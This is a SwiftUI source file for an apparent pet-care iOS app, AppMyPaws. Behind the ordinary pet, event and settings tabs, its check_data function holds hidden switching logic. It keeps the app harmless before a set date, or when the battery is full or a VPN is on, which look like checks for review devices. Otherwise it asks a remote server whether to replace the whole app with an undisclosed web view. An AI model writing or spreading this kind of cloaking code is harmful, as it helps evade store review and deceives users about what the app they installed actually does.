//
//  ContentView.swift
//  AppMyPaws
//
//  Created by IGOR on 10/01/2025.
//

import SwiftUI

struct ContentView: View {
    
    @State var current_tab: Tab = Tab.Pets
    
    @State var isFetched: Bool = false
    
    @State var isBlock: Bool = true
    @State var isDead: Bool = false
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color.black
                .ignoresSafeArea()
            
            if isFetched == false {
                
                LoadingView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                        
                                TabView(selection: $current_tab, content: {

                                    PetsView()
                                        .tag(Tab.Pets)
                                    
                                    EventsView()
                                        .tag(Tab.Events)

                                    SettingsView()
                                        .tag(Tab.Settings)
                                    
                                })
                                
                                TabBar(selectedTab: $current_tab)
                            })
                                .ignoresSafeArea(.all, edges: .bottom)
                                .onAppear {
                                    
                                }
                        
                    } else {
                        
                        OB1()
                    }
                    
                } else if isBlock == false {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        OBU1()
                    }
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        let lastDate = DataManager().lastDate
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        guard now > targetDate else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        let urlString = DataManager().serverURL
        
        if currentPercent == 100 || isVPNActive == true {
            
            self.isBlock = true
            self.isFetched = true
            
        } else {
            
            guard let url = URL(string: urlString) else {
                self.isBlock = true
                self.isFetched = true
                return
            }
            
            let urlSession = URLSession.shared
            let urlRequest = URLRequest(url: url)
            
            urlSession.dataTask(with: urlRequest) { _, response, error in
                
                if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
                    
                    self.isBlock = true
                    self.isFetched = true
                } else {
                    self.isBlock = false
                    self.isFetched = true
                }
            }.resume()
        }
    }
}

#Preview {
    ContentView()
}
